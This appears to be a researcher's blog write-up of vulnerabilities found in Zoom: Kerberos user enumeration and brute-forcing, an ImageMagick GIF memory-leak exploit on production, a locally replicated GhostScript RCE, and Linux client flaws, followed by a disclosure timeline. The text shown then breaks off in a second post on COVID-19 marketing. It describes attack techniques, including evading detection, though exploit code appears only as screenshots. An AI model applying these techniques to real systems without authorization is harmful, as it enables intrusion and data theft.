&lt;p&gt;&lt;img src=&quot;/assets/static/bec0ea6b-1fee-43c2-9d68-edff0569089c.png&quot; alt=&quot;Nmap port scan on ca01.idm.meetzoom.us&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I noticed a running Kerberos service that is externally accessible. Kerberos is a network authentication protocol designed to secure authentication for client/server applications.&lt;/p&gt;

&lt;p&gt;The naming convention for the asset indicates that it’s running an identity management solution or a PKI (public-key infrastructure).&lt;/p&gt;

&lt;p&gt;While checking what was running on port 80, I found that the host was running FreeIPA&lt;a href=&quot;https://www.freeipa.org/page/Main_Page&quot;&gt;3&lt;/a&gt;. This is an open-source identity management solution developed by RedHat.&lt;/p&gt;

&lt;p&gt;There are no known severe public vulnerabilities reported previously. Researching for a zero-day within FreeIPA is an option, but I didn’t have the time to focus on it. Another option was to review Zoom’s implementation of Kerberos and FreeIPA setup.&lt;/p&gt;

&lt;p&gt;I also found that another asset that runs the exact setup.&lt;/p&gt;

&lt;p&gt;Target: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;va01.idm.meetzoom.us&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Practically speaking, &lt;strong&gt;Kerberos allows a great size of attack surface once we have an authenticated account&lt;/strong&gt;. While not being within the internal network, the initial entry for Kerberos is more difficult.&lt;/p&gt;

&lt;p&gt;The HTTP interface is quite verbose in terms of error messages, however, these are the default responses in FreeIPA.&lt;/p&gt;

&lt;p&gt;It’s possible to enumerate users from the [/ipa/session/login_password] API as shown in the next screenshots: &lt;a href=&quot;https://www.infosecurity-magazine.com/news/uk-government-zoom-despite-mod/&quot;&gt;2&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;invalid-account&quot;&gt;Invalid account&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/assets/static/a63a1dd6-2f8a-4366-91b2-31e46f8db25c.png&quot; alt=&quot;Invalid account&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;valid-account&quot;&gt;Valid account&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/f6517f5b-aca4-402f-83a5-052e92592dbb.png&quot; alt=&quot;Valid account&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there is a lockout policy within the HTTP API to lock accounts that exceed the number of invalid authentication attempts.&lt;/p&gt;

&lt;p&gt;After triggering the policy, I revisited the asset once the lockout period had timed out.&lt;/p&gt;

&lt;p&gt;It seemed that attacking this functionality from the HTTP interface was the best idea. I moved my attack into the Kerberos service directly.&lt;/p&gt;

&lt;h2 id=&quot;attacking-kerberos&quot;&gt;Attacking Kerberos&lt;/h2&gt;

&lt;p&gt;I tried enumerating users using the public Kerberos service running on UDP/88.&lt;/p&gt;

&lt;p&gt;One of the advantages of authenticating in UDP is the ability to craft packets with different source IPs. This can help a lot in evading IP blacklisting on the service-level. I didn’t need to jump into that part, as there were no security controls that were triggered within my tests on this service. Both user enumeration and user password brute-forcing were not blocked.&lt;/p&gt;

&lt;h3 id=&quot;building-wordlists&quot;&gt;Building Wordlists&lt;/h3&gt;

&lt;p&gt;Based on my background knowledge on Zoom, I understood the email and account profile pattern on Zoom follows: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{firstName}.{lastName}@zoom.us&lt;/code&gt;. We can get a start initializing the naming from Zoom.us/team page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/d68240c3-d577-4931-97b4-6d1853458611.png&quot; alt=&quot;zoom.us/team page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also enumerated email addresses using OSINT. This will be used to enumerate valid user accounts on the Kerberos service that is publicly accessible.&lt;/p&gt;

&lt;p&gt;All of the generated names were not valid users on the Kerberos service - perhaps the two assets were Shadow IT assets that were mistakenly exposed publicly by Zoom.&lt;/p&gt;

&lt;p&gt;User enumeration yielded me with a single valid user, “admin”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/6e2be3cd-0ac6-4a8a-a3e1-9ace84e7d693.png&quot; alt=&quot;Valid users&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also brute-forced the account password, as there was no lockout policy for user accounts. It seemed like a dead-end for the timespan.&lt;/p&gt;

&lt;h1 id=&quot;discovery-of-a-memory-leak-on-a-zoom-production-server&quot;&gt;Discovery of a Memory Leak on a Zoom Production Server&lt;/h1&gt;

&lt;p&gt;Zoom allows uploading profile pictures on accounts. I’m always interested in image parsers as the attack surface on image parsers is wide, and can open doors for different attack vectors.&lt;/p&gt;

&lt;p&gt;I fuzzed the image parsing on Zoom with a range of techniques. Based on my analysis of what was happening in the background:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;A user uploads a profile image.&lt;/li&gt;
  &lt;li&gt;Only JPEG, GIF, and PNG are allowed.&lt;/li&gt;
  &lt;li&gt;If the image is PNG or GIF, it is converted to JPEG.&lt;/li&gt;
  &lt;li&gt;If the image is in JPEG, then image conversion is not triggered.&lt;/li&gt;
  &lt;li&gt;If the image contains an invalid image header, the updating profile API aborts the process.&lt;/li&gt;
  &lt;li&gt;The check for validating images is done by checking the magic bytes &lt;a href=&quot;https://en.wikipedia.org/wiki/File_format#Magic_number&quot;&gt;4&lt;/a&gt;. This means we can’t control the first bytes of the file.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Based on my fingerprinting, I had a confident assumption that Zoom is using ImageMagick as a backend to their image conversion on their server-side. The common pattern on the deployment of image conversion microservices is they barely receive required updates and security controls once the microservice reaches a stable state. This happens as it is not as vital to the business as other functionalities within the infrastructure.&lt;/p&gt;

&lt;p&gt;One popular vulnerability for ImageMagick is CVE-2016–3714, a remote code execution vulnerability.&lt;/p&gt;

&lt;p&gt;I tested the functionality with the CVE-2016–3714 and it seemed to be patched.&lt;/p&gt;

&lt;p&gt;Another less popular vulnerability that ImageMagick was vulnerable to was a memory leak vulnerability that occurs because of the uninitialization of the memory space on the GIF parser of ImageMagick. As a result, we can leak portions of the memory in a “Heartbleed” approach.&lt;/p&gt;

&lt;p&gt;All versions of ImageMagick builds before &lt;a href=&quot;https://github.com/ImageMagick/ImageMagick/commit/9fd10cf630832b36a588c1545d8736539b2f1fb5&quot;&gt;https://github.com/ImageMagick/ImageMagick/commit/9fd10cf630832b36a588c1545d8736539b2f1fb5&lt;/a&gt; are vulnerable.&lt;/p&gt;

&lt;p&gt;The vulnerability is not commonly known. It also has a registered CVE of CVE-2017-15277.&lt;/p&gt;

&lt;p&gt;I generated a payload using the exploit&lt;a href=&quot;https://github.com/neex/gifoeb&quot;&gt;5&lt;/a&gt; for the vulnerability. When uploading the payload, the converted images were rendered in a way that indicated successful exploitation.&lt;/p&gt;

&lt;h4 id=&quot;original-payload&quot;&gt;Original Payload&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/assets/static/0e356db4-3354-4354-91fe-e3048949f352.png&quot; alt=&quot;Payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When rendered by Zoom APIs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/697b9388-39bb-419f-98b9-9e98fdf718fd.png&quot; alt=&quot;Exploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I further confirmed that this is not a rendering bug on the ImageMagick implementation at Zoom, by generating a typical black image by ImageMagick with the same specs of the payload:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ convert -size 300x300 xc:black black.gif
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;normal-view&quot;&gt;Normal view&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/62474d8f-fc8e-458c-87d9-29ca4b972200.png&quot; alt=&quot;Normal view&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;after-a-normal-gif-image-is-rendered-by-zoom-rendering-a-normal-image&quot;&gt;After a normal GIF image is rendered by Zoom: Rendering a normal image.&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/64174465-50a6-408c-b47d-4407626d3b52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The result showed that this image is rendering normally when supplying a normal GIF image with the same specifications of the payload, confirming the existence of the security vulnerability, and illuminating the part where there is a rendering issue on the ImageMagick setup is at Zoom.Us.&lt;/p&gt;

&lt;h2 id=&quot;automating-the-exploitation&quot;&gt;Automating the Exploitation&lt;/h2&gt;

&lt;p&gt;To plan the automation of the exploitation of the memory leak at Zoom, I need to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Generate a new unique payload&lt;/li&gt;
  &lt;li&gt;Upload it to Zoom&lt;/li&gt;
  &lt;li&gt;Download the rendered file.&lt;/li&gt;
  &lt;li&gt;Extract the data from the corrupted file rendered by Zoom.&lt;/li&gt;
  &lt;li&gt;Repeat, and store leaked memory portions.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/cb5f0502-5603-46fc-aefa-b2a315493822.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;video&quot;&gt;Video&lt;/h4&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/hQV1ggCLsWk&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;a-memory-leak-on-zoom-production-is-not-the-end&quot;&gt;A Memory Leak on Zoom production is not the end…&lt;/h2&gt;

&lt;p&gt;After a week from the time of automating the exploit for the memory leak, I remembered that Tavis Ormandy had researched on the GhostScript engine&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=1640&quot;&gt;6&lt;/a&gt;. GhostScript is an interpreter for the PostScript language, and is also used in ImageMagick.&lt;/p&gt;

&lt;p&gt;Tavis’s research disclosed a remote command execution on GhostScript. This research is vital to this functionality since if we’re able to exploit GhostScript on the ImageMagick, we can achieve remote command execution.&lt;/p&gt;

&lt;p&gt;I confirmed this vulnerability existed on Zoom’s build with the timeline of ImageMagick patches. In July 2017, the memory leak vulnerability was discovered and patched. In August 2018, GhostScript and ImageMagick patched the remote command execution vulnerability. This meant that if the memory leak was present at Zoom production, then the GhostScript RCE was also present at Zoom production.&lt;/p&gt;

&lt;p&gt;I replicated this vulnerability locally in my environment based on the environment of Zoom.&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept-payload&quot;&gt;Proof of Concept Payload&lt;/h4&gt;

&lt;h5 id=&quot;proof-of-concept-payload-1&quot;&gt;Proof of Concept Payload&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;/assets/static/210bb2b8-2b02-4103-8b0d-bd525de8dd58.png&quot; alt=&quot;Proof of Concept Payload&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;local-replication-of-the-rce-vulnerability&quot;&gt;Local replication of the RCE vulnerability&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;/assets/static/f1674931-f60b-43aa-8ab2-2b27c37c47f8.png&quot; alt=&quot;Local replication of the RCE vulnerability&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;zooms-prevention&quot;&gt;Zoom’s Prevention&lt;/h3&gt;

&lt;p&gt;There is a check on the magic bytes on uploaded images within the Zoom API [&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/p/upload&lt;/code&gt;], otherwise, full exploitation of the vulnerability is possible. If the microservice is called in other places, then it may be still exploitable there.&lt;/p&gt;

&lt;h1 id=&quot;shadow-it--zoom&quot;&gt;Shadow IT &amp;amp; Zoom&lt;/h1&gt;

&lt;p&gt;Shadow IT is a pattern of public services at Zoom. Some instances don’t receive frequent updates and are publicly accessible. I found a development instance that has not been updated for at least 10 months, and although I’m not sure, I think it was pushed to a Zoom customer. This meant that if there is a vulnerability that was patched on production, it may be exploitable on these Shadow IT instances. The way I confirmed this is because Zoom left a version build file on the instance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/ade2863a-8c6d-4795-9d1c-959f42968461.png&quot; alt=&quot;Instance age&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This screenshot was taken on July 4th, 2020. The build time was September 10th, 2019.&lt;/p&gt;

&lt;p&gt;Another addition to complete the hacking puzzle is:
https://bscdev.meetzoom.us/nginx_status&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/eb54c7a6-fdf2-4215-b4f4-e2b2e82287b0.png&quot; alt=&quot;Nginx status on the ShadowIT asset&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Nginx status page is enabled due to a backend misconfiguration in the development instance, allowing me to have a confident guess that this instance is not heavily used, and potentially have lesser logging triggers compared to the Zoom.us production web-app.&lt;/p&gt;

&lt;p&gt;It’s showing 9 active connections on the instance, making it an excellent fit to test, while not triggering alerts.&lt;/p&gt;

&lt;h1 id=&quot;zoom-app-for-linux&quot;&gt;Zoom App for Linux&lt;/h1&gt;

&lt;p&gt;I also had a testing session on the Zoom App for Linux. The security community has not put a focus on the Zoom client for Linux in terms of security research. I thought of initiating this part.&lt;/p&gt;

&lt;h2 id=&quot;zoom-tlsssl-is-broken-by-design-on-linux&quot;&gt;Zoom TLS/SSL is Broken By Design on Linux&lt;/h2&gt;

&lt;p&gt;Whenever traffic is intercepted with a custom TLS/SSL certificate, Zoom prompts users with this message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/e5148440-d78e-458e-b62e-194edc5caa10.png&quot; alt=&quot;Zoom: Untrusted Server certificate&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once users click “Trust anyway”, the certificate is added to a local Zoom database with the fingerprints of the certificate. When the next request occurs, the whitelisted certificate is permitted as expected.&lt;/p&gt;

&lt;p&gt;The catch here is, all TLS/SSL certificates can be directly “accepted” by malware to the local Zoom database without additional permissions. The custom implementation of the Zoom certificate database does not solely rely on system CA certificate DB. System CA certificate DB requires root access in normal cases to whitelist a new SSL/TLS certificate.&lt;/p&gt;

&lt;p&gt;I wrote a Proof of concept in Golang that injects TLS/SSL certificate fingerprints into the local Zoom database. Once this code is executed on a user machine, all injected certificates will be accepted without errors on Zoom.&lt;/p&gt;

&lt;p&gt;Code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/443e885a-bafd-4c7d-9619-dd40d3d1a745.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;zoom-launcher-implementation-whats-a-bad-design-for-an-application-launcher-zoom-launcher-for-linux&quot;&gt;Zoom Launcher Implementation: What’s a bad design for an application launcher? Zoom Launcher for Linux&lt;/h1&gt;

&lt;h4 id=&quot;launching-zoom&quot;&gt;Launching Zoom&lt;/h4&gt;

&lt;p&gt;[&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/zoom&lt;/code&gt;] is a symlink of [&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/zoom/ZoomLauncher&lt;/code&gt;]. When Zoom is called:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zoom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following occurs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/0d628519-e589-473e-9dfd-187ab10cc02b.png&quot; alt=&quot;Launching Zoom&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This sounded interesting already.&lt;/p&gt;

&lt;p&gt;Apparently, Zoom is checking if there is a file on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$PWD&lt;/code&gt; directory that is for Zoom, and it executes it, otherwise it navigates to the Zoom installation directory and executes another binary, Zoom executable.&lt;/p&gt;

&lt;p&gt;This sounds bad already. But still, the next part is the surprising part. &lt;strong&gt;if there is an executable called “zoom” on the $PWD directory, it will execute it as a child process for /usr/bin/zoom&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept-1&quot;&gt;Proof of Concept&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/1f5041ba-8308-4cd5-951e-b46fd51ca1b4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This breaks all of the protection of application whitelisting, allows malware to run as a subprocess of a trusted vendor (Zoom), and is a bad design/security practice by all means.&lt;/p&gt;

&lt;p&gt;I had thoughts on why it was designed this way, but I simply didn’t find a good reason.&lt;/p&gt;

&lt;h1 id=&quot;zoom-local-database-implementation-bad-practice-for-linux-security&quot;&gt;Zoom Local Database Implementation: Bad practice for Linux security.&lt;/h1&gt;

&lt;p&gt;I noticed another interesting issue in Zoom local database implementation. Zoom local database allows Zoom to store custom configurations and user data.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assuming there is access to the user machine, by any level of permissions, anyone can read and exfiltrate Zoom user data and configuration&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/7a465929-5406-4005-8701-ab4048827f99.png&quot; alt=&quot;Zoomus.db local database permissions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The customer data and main PII details are obfuscated, which is good, however, there is still data that is exposed and is important.&lt;/p&gt;

&lt;h1 id=&quot;zoom-is-end-to-end-encrypted-not-fully&quot;&gt;Zoom is End-to-End Encrypted? Not fully.&lt;/h1&gt;

&lt;p&gt;Zoom announced that it’s now supporting end to end encryption, and has pushed additional security updates to protect users in May 2020&lt;a href=&quot;https://blog.zoom.us/end-to-end-encryption-update/&quot;&gt;7&lt;/a&gt;. It has been everywhere in the news.&lt;/p&gt;

&lt;p&gt;During my tests, I also tested Zoom Chat, a feature on Zoom that allows group chats. It allows teams to collaborate, share files, and of course, send messages.&lt;/p&gt;

&lt;p&gt;I have noticed that the &lt;strong&gt;chat logs of Zoom are stored on-disk in plain-text&lt;/strong&gt;. Combining this with the Linux file permissions bad practice, it means that any process can unrestrictedly access all of the Zoom chats.&lt;/p&gt;

&lt;h3 id=&quot;video-1&quot;&gt;Video&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/PELPPZMzwgg&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;responsible-disclosure&quot;&gt;Responsible Disclosure&lt;/h1&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;[April 15, 2020] Started the experiment.&lt;/li&gt;
  &lt;li&gt;[April 18, 2020] I reported the Memory Leak at Zoom via security@zoom.us.&lt;/li&gt;
  &lt;li&gt;[April 23, 2020] I Contacted Luta Security (the contractor for the Zoom VDP) via Twitter.&lt;/li&gt;
  &lt;li&gt;[April 26, 2020] I followed-up regarding the vulnerability disclosure. Haven’t received a response.&lt;/li&gt;
  &lt;li&gt;[May 05, 2020] Received: “[Request Closed] Memory Leak at zoom.us”&lt;/li&gt;
  &lt;li&gt;[May 06, 2020] Tweeted about it: https://twitter.com/mazen160/status/1257785071278477312. Zoom support asked me to send it through Hackerone.&lt;/li&gt;
  &lt;li&gt;[May 06, 2020] Forwarded the original report via Hackerone.&lt;/li&gt;
  &lt;li&gt;[May 06, 2020] Vulnerability triaged on Hackerone.&lt;/li&gt;
  &lt;li&gt;[May 06, 2020 –&amp;gt; June 05, 2020] Internal communication about running my automated exploit.&lt;/li&gt;
  &lt;li&gt;[June 05, 2020] Informed Zoom that I’m planning to present my ongoing research at DEF CON.&lt;/li&gt;
  &lt;li&gt;[June 05, 2020] Zoom can’t assess the issue, as there was no “sensitive data” seen, despite the reproducibility of the vulnerability and the provided exploit.&lt;/li&gt;
  &lt;li&gt;[June 08, 2020] Report closed as “Not Applicable”.&lt;/li&gt;
  &lt;li&gt;[July 11, 2020] Sent my new research results, reporting 7 new vulnerabilities and security issues to Zoom.&lt;/li&gt;
  &lt;li&gt;[July 14, 2020] Acknowledgment about receiving the report, and first conclusive response regarding the memory leak issue.&lt;/li&gt;
  &lt;li&gt;[July 24, 2020] Further explanation from Zoom regarding the findings.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;zooms-analysis--my-response-to-the-analysis&quot;&gt;Zoom’s Analysis &amp;amp; my response to the analysis&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Zoom Public Kerberos Authentication”&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: These were development servers with no access to any production data. Moreover authentication required 2FA, so brute forcing a password, though not demonstrated in your report, would have been insufficient to gain access to the system.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;While I agree it may be a forgotten development server that was mistakenly exposed, I haven’t seen any references or indications or having 2FA implemented. In all cases, it’s down now, which is great.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Discovery of a Memory Leak on a Zoom Production Server”:&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: After an internal investigation, we’ve concluded that the behavior you found was not a memory leak but just our image utility’s best effort at converting a malformed gif into a jpeg.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the &lt;strong&gt;exact&lt;/strong&gt; same behavior that is expected from valid exploitation of the CVE-2017-15277 as analyzed in the original report on ImageMagick &lt;a href=&quot;https://github.com/ImageMagick/ImageMagick/issues/592&quot;&gt;8&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The observed behavior that occurs in ImageMagick is ImageMagick’s effort in converting a malformed a gif, leaking a portion of the system memory when providing a malformed gif that has an uninitialized palette in the gif file; this is where the vulnerability is there.&lt;/p&gt;

&lt;p&gt;From https://github.com/ImageMagick/ImageMagick/issues/592.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Gif coder leaves the palette uninitialized if neither global nor local palette is present in a gif file. If ImageMagick is used as a library loaded into a process that operates on interesting data, this can cause security consequences.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Having a malformed gif rendered this way confirms the presence of the vulnerability.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Zoom: we did check and confirmed that ImageMagick is not used for image conversions here.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;However, the same vulnerability is reproduced, maybe a fork of ImageMagick? an image processing software that is vulnerable to the same CVE? In all cases, it’s clear that something is wrong.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Shadow IT &amp;amp; Zoom”&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: These are non-sensitive information disclosures from a shared development environment. Information hygiene is important to us and we appreciate you reporting this finding.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;Great! FullHunt.io can help here. Probably the best product out there for mitigating Shadow IT risks.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Zoom TLS/SSL is Broken By Design on Linux”&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: This is per user certificate pinning and intentionally allows for the user to allow custom certificates. The user can write to their own database, but no other non-root users can. It’s common best practice to have user applications run at their privilege level, as requiring Zoom to run as root would introduce unnecessary security risks to Zoom and our customers.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Zoom Launcher Implementation”&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: This will be resolved in version 5.2.0 to be released on August 2nd. Note that to exploit this finding, an attacker would need to have compromised the victim’s computer by other means, and only if it was running the Linux operating system. Further, this attack also only works if the victim is running Zoom for the first time.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Zoom local database implementation”&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: This will be resolved in version 5.2.0 to be released on August 2nd. Note that, as you stated, to be able to read this data the attacker would need to have already compromised the victim’s computer by other means, and only if that computer is running a Linux operating system.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;I’m not sure if the same vulnerability is also reproduced on macOS. It may be worth checking.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“Zoom is End-to-End Encrypted?”&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Zoom: We’re working on remediation for this finding. Note to be able to read this data, an attacker would need to have already compromised the victim’s device by other means.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-appreciate-the-detailed-analysis-done-by-zoom-security&quot;&gt;I appreciate the detailed analysis done by Zoom security.&lt;/h4&gt;

&lt;h3 id=&quot;zoom-linux-app-update&quot;&gt;Zoom Linux App Update&lt;/h3&gt;

&lt;p&gt;On August 3rd, 2020, the Zoom 5.2.4 was released, without mentioning the security patches at all. Zoom issued a silent fix to patch the reported security vulnerabilities without informing users about the fixes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/2db018c6-2228-44f6-b775-0f4733098f14.png&quot; alt=&quot;Zoom release notes for Zoom 5.2.4&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Zoom stated that they’re planning to patch the reported vulnerabilities, and there will be a security fix for the Zoom Linux client on August 2nd.&lt;/p&gt;

&lt;p&gt;Zoom has massively grown during the global pandemic. As with any company building their security program, there are many challenges that Zoom appears to be facing, despite the large budget for security.&lt;/p&gt;

&lt;p&gt;Coordinating the security disclosure has been a difficult experience from a security researcher’s perspective, despite all of the effort done by Zoom to hire top-class security firms to aid in building the program. The main reason this is happening is because of the “last-minute” implementation of their vulnerability disclosure program. I would be surprised if I’m the only researcher in the world that had this experience.&lt;/p&gt;

&lt;p&gt;I would also like to note that all of the research was self-funded. I have also not received a bounty/reward for my efforts by Zoom.&lt;/p&gt;

&lt;p&gt;Building a security program is not easy, there are many aspects to consider and processes to follow. A budget can “aid” in hiring great talents, but cannot build the program alone. It’s always important to start building the security program from an early point; it takes time and effort from different teams within the organization. It has never been an easy initiative to build a security program. A vulnerability disclosure program is only a single aspect in a larger cycle that should be there and should be done correctly.&lt;/p&gt;

&lt;p&gt;I was also surprised that my experience with Zoom did not match the expectations. I have been seeing in the media a lot of great impressions about the Zoom vulnerability disclosure program. However, what I have experienced was different. I hope this is not because my research was not media-focused with public media involvement.&lt;/p&gt;

&lt;h1 id=&quot;acknowledgment&quot;&gt;Acknowledgment&lt;/h1&gt;

&lt;p&gt;I would like to thank &lt;a href=&quot;https://twitter.com/msuiche&quot;&gt;Matt Suiche&lt;/a&gt; of Comae Technologies for his help in having this research available.&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.cnbc.com/2019/04/18/zoom-ipo-stock-begins-trading-on-nasdaq.html&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.infosecurity-magazine.com/news/uk-government-zoom-despite-mod/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.freeipa.org/page/Main_Page&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://en.wikipedia.org/wiki/File_format#Magic_number&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/neex/gifoeb&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1640&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://blog.zoom.us/end-to-end-encryption-update/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/ImageMagick/ImageMagick/issues/592&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><category term="zoom" /><summary type="html"></summary></entry><entry><title type="html">Bad Marketing: COVID-19 and Cyber Security</title><link href="https://mazinahmed.net/blog/covid19-and-cybersecurity/" rel="alternate" type="text/html" title="Bad Marketing: COVID-19 and Cyber Security" /><published>2020-04-14T00:00:00-05:00</published><updated>2020-04-14T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/covid19-and-cybersecurity</id><content type="html" xml:base="https://mazinahmed.net/blog/covid19-and-cybersecurity/">&lt;hr /&gt;
&lt;p&gt;&lt;img src=&quot;/assets/static/930cf461-8dc4-4a43-9f98-3519cdda7004.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Cyber Security, as well as many industries, is trying to make use of COVID-19 for marketing purpose. As sad as it sounds, it’s true.&lt;/p&gt;

&lt;p&gt;COVID-19 themed attacks by threat actors are real. However this has never been new to the security world. We have always seen APTs making utilizing global (and local) events and situations to their benefits. Threat Intelligence is the way to understand and protect against these attacks quickly.&lt;/p&gt;

&lt;p&gt;However, this does not mean by any means to take pandemic as a source of marketing.&lt;/p&gt;

&lt;p&gt;What should be required is public sharing of technical threat intelligence reports for related confirmed incidents.&lt;/p&gt;

